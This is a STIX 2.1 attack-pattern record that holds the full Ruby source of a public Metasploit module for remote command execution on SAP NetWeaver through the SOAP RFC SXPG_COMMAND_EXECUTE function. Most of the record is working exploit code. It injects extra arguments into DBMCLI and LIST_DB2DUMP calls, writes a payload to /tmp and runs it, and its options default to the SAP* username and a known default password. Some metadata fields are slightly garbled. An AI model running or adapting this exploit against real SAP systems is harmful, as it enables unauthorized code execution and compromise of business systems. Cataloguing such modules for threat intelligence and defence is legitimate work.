{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57beb1aa-65f0-45fc-8132-5742bf308709",
    "created": "2024-08-14T17:05:27.393131Z",
    "modified": "2024-08-14T17:05:27.393135Z",
    "name": "SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution",
    "description": " This module abuses the SAP NetWeaver SXPG_COMMAND_EXECUTE function, on the SAP SOAP RFC Service, to execute remote commands. This module needs SAP credentials with privileges to use the /sap/bc/soap/rfc in order to work. The module has been tested successfully on Windows 2008 64-bit and Linux 64-bit platforms.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/sap/sap_soap_rfc_sxpg_command_exec.rb",
            "external_id": "sap_soap_rfc_sxpg_command_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://service.sap.com/sap/support/notes/1764994"
        },
        {
            "source_name": "reference",
            "url": "https://service.sap.com/sap/support/notes/1341333"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy.\n#\n# The following guys from ERP-SCAN deserve credit for their contributions -\n# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and\n# Dmitry Evdokimov.\n#\n# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis\n# who have Beta tested the modules and provided excellent feedback. Some people\n# just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    super(\n      'Name' => 'SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution',\n      'Description' => %q{\n          This module abuses the SAP NetWeaver SXPG_COMMAND_EXECUTE function, on the SAP\n        SOAP RFC Service, to execute remote commands. This module needs SAP credentials with\n        privileges to use the /sap/bc/soap/rfc in order to work. The module has been tested\n        successfully on Windows 2008 64-bit and Linux 64-bit platforms.\n      },\n      'References' =>\n        [\n          [ 'URL', 'http://labs.mwrinfosecurity.com/blog/2012/09/03/sap-parameter-injection' ],\n          [ 'URL', 'https://service.sap.com/sap/support/notes/1764994' ],\n          [ 'URL', 'https://service.sap.com/sap/support/notes/1341333' ]\n        ],\n      'DisclosureDate' => 'May 8 2012',\n      'Platform'       => %w{ unix win },\n      'Targets' => [\n        [ 'Linux',\n          {\n            'Arch'     => ARCH_CMD,\n            'Platform' => 'unix'\n            #'Payload'  =>\n              #{\n                #'DisableNops' => true,\n                #'Space'       => 232,\n                #'Compat'      =>\n                  #{\n                    #'PayloadType' => 'cmd',\n                    #'RequiredCmd' => 'perl ruby',\n                  #}\n              #}\n          }\n        ],\n        [ 'Windows x64',\n          {\n            'Arch' => ARCH_X64,\n            'Platform' => 'win',\n            'CmdStagerFlavor' => 'vbs'\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'Privileged' => false,\n      'Author' =>\n        [\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n    )\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('CLIENT', [true, 'SAP Client', '001']),\n        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n        OptString.new('HttpPassword', [true, 'Password', '06071992'])\n      ])\n    register_advanced_options(\n      [\n        OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments (Windows Target)', 250]),\n      ])\n  end\n\n  def send_soap_request(data)\n    res = send_request_cgi({\n      'uri' => '/sap/bc/soap/rfc',\n      'method' => 'POST',\n      'data' => data,\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n      'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],\n      'ctype' => 'text/xml; charset=UTF-8',\n      'headers' => {\n        'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n      },\n      'vars_get' => {\n        'sap-client' => datastore['CLIENT'],\n        'sap-language' => 'EN'\n      }\n    })\n    return res\n  end\n\n  def build_soap_request(command, sap_command, sap_os)\n    data = \"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\" ?>\\r\\n\"\n    data << \"<env:Envelope xmlns:xsd=\\\"http://www.w3.org/2001/XMLSchema\\\" xmlns:env=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\">\\r\\n\"\n    data << \"<env:Body>\\r\\n\"\n    data << \"<n1:SXPG_COMMAND_EXECUTE xmlns:n1=\\\"urn:sap-com:document:sap:rfc:functions\\\" env:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\\r\\n\"\n    data << \"<ADDITIONAL_PARAMETERS>#{command}</ADDITIONAL_PARAMETERS>\\r\\n\"\n    data << \"<COMMANDNAME>#{sap_command}</COMMANDNAME>\\r\\n\"\n    data << \"<OPERATINGSYSTEM>#{sap_os}</OPERATINGSYSTEM>\\r\\n\"\n    data << \"<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>\\r\\n\"\n    data << \"</n1:SXPG_COMMAND_EXECUTE>\\r\\n\"\n    data << \"</env:Body>\\r\\n\"\n    data << \"</env:Envelope>\"\n\n    return data\n  end\n\n  def check\n    data = rand_text_alphanumeric(4 + rand(4))\n    res = send_soap_request(data)\n    if res and res.code == 500 and res.body =~ /faultstring/\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if target.name =~ /Windows/\n      linemax = datastore['PAYLOAD_SPLIT']\n      vprint_status(\"#{rhost}:#{rport} - Using custom payload size of #{linemax}\") if linemax != 250\n      print_status(\"#{rhost}:#{rport} - Sending SOAP SXPG_COMMAND_EXECUTE request\")\n      execute_cmdstager({ :delay => 0.35, :linemax => linemax })\n    elsif target.name =~ /Linux/\n      file = rand_text_alphanumeric(5)\n      stage_one = create_unix_payload(1,file)\n      print_status(\"#{rhost}:#{rport} - Dumping the payload to /tmp/#{file}...\")\n      res = send_soap_request(stage_one)\n      if res and res.code == 200 and res.body =~ /External program terminated/\n        print_good(\"#{rhost}:#{rport} - Payload dump was successful\")\n      else\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Payload dump failed\")\n      end\n      stage_two = create_unix_payload(2,file)\n      print_status(\"#{rhost}:#{rport} - Executing /tmp/#{file}...\")\n      send_soap_request(stage_two)\n    end\n  end\n\n  def create_unix_payload(stage, file)\n    command = \"\"\n    if target.name =~ /Linux/\n      if stage == 1\n        my_payload = payload.encoded.gsub(\" \",\"\\t\")\n        my_payload.gsub!(\"&\",\"&amp;\")\n        my_payload.gsub!(\"<\",\"&lt;\")\n        command = \"-o /tmp/\" + file + \" -n pwnie\" + \"\\n!\"\n        command << my_payload\n        command << \"\\n\"\n      elsif stage == 2\n        command = \"-ic /tmp/\" + file\n      end\n\n    end\n\n    return build_soap_request(command.to_s, \"DBMCLI\", \"ANYOS\")\n  end\n\n  def execute_command(cmd, opts)\n    command = cmd.gsub(/&/, \"&amp;\")\n    command.gsub!(/%TEMP%\\\\/, \"\")\n    data = build_soap_request(\"&amp;#{command}\", \"LIST_DB2DUMP\", \"Windows NT\")\n    begin\n      res = send_soap_request(data)\n      if res and res.code == 200\n        return\n      else\n        if res and res.body =~ /faultstring/\n          error = res.body.scan(%r{<faultstring>(.*?)</faultstring>})\n          0.upto(error.length-1) do |i|\n            vprint_error(\"#{rhost}:#{rport} - Error #{error[i]}\")\n          end\n        end\n        print_status(\"#{res.code}\\n#{res.body}\")\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Error injecting command\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Unable to connect\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "May 8 2012",
    "x_mitre_platforms": [
        "win'"
    ]
}